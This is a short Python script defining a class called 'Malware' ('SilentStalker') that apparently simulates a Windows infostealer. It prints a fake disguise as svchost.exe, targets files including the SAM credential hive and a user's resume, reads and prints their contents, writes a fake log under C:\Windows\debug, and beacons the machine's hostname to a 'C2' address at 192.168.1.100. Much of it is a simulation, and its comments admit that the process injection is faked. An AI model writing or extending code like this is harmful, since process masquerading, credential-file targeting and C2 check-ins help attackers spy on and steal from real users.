import os
import sys
import subprocess
import socket
import time
import random
from datetime import datetime

class Malware:
    def __init__(self, name="SilentStalker"):
        self.name = name
        self.process_name = name
        self.hidden_name = "svchost.exe"  # Disguise the process name
        self.target_files = [
            r"C:\Users\Public",
            r"C:\Windows\System32\config\SAM",
            r"C:\Users\Public\Desktop"
        ]

    def hide_process(self):
        """Disguise the process name by injecting into a system process."""
        print(f"[+] Injecting {self.process_name} into a hidden process...")
        # In a real scenario, this involves complex memory injection.
        # Here we just simulate the rename for the sake of the example.
        self.actual_process_name = self.process_name
        print(f"[+] Process now appears as: {self.hidden_name}")

    def exfiltrate_data(self, filepath):
        """Simulates reading a file from disk."""
        print(f"[+] Scanning target: {filepath}")
        if os.path.exists(filepath):
            try:
                with open(filepath, 'r', errors='ignore') as f:
                    content = f.read()
                    # Truncate long lines for display
                    lines = [line[:100] for line in content.split('\n')]
                    print(f"[DATA] Sample content found: {lines[:3]}")
                    print(f"[+] Data successfully extracted.")
                return content
            except Exception as e:
                print(f"[-] Error reading file: {e}")
                return None
        else:
            print(f"[-] File not found: {filepath}")
            return None

    def open_log(self):
        """Attempts to open and read system logs."""
        log_path = r"C:\Windows\debug\log.txt" 
        # Simulate creating a log if it doesn't exist for testing
        if not os.path.exists(log_path):
            print(f"[+] Creating fake log at {log_path}...")
            os.makedirs(os.path.dirname(log_path), exist_ok=True)
            with open(log_path, 'w') as f:
                f.write(f"Log Start: {datetime.now()}\n")
                f.write("User: Admin\n")
                f.write("Action: Connected to remote server\n")

        print(f"[+] Opening log file: {log_path}")
        self.exfiltrate_data(log_path)

    def establish_connection(self):
        """Attempts to connect to a C2 (Command & Control) server."""
        ip = "192.168.1.100"
        port = random.randint(1024, 65535)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(f"{self.name} Connected from {os.popen('hostname').read()}\n".encode())
            print(f"[+] Connected to C2 Server at {ip}:{port}")
            # In a real scenario, the server would send commands back here.
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False

    def run(self):
        print(f"[*] Initializing {self.name}...")
        self.hide_process()
        self.open_log()
        self.exfiltrate_data(r"C:\Users\Public\Documents\Resume.txt") # Common target
        time.sleep(2)
        self.establish_connection()
        print("[+] Malware execution cycle complete.")

if __name__ == "__main__":
    malware = Malware()
    malware.run()
